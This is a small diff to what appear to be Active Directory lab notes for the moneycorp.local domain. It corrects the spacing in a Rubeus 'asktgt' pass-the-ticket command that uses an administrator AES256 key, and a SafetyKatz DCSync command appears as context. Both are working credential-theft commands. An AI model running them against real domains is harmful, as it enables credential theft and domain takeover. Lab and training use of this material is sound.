@@ -695,8 +695,11 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\administrator /domain:mo
 ```
 
 
+2. 
 
 
 ```powershell
-C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\administrator/domain:moneycorp.local/dc:mcorp-dc.moneycorp.local/aes256:a85958da138b6b0ce a2ec07d3cb57b76fdbd6886938c0250bb5873e2b32371a0 /opsec /createnetonly: C:\Windows\System32\cmd.exe /show/ptt
+C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\administrator /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /aes256:a85958da138b6b0cea2ec07d3cb57b76fdbd6886938c0250bb5873e2b32371a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show/ptt
 ```
+
+
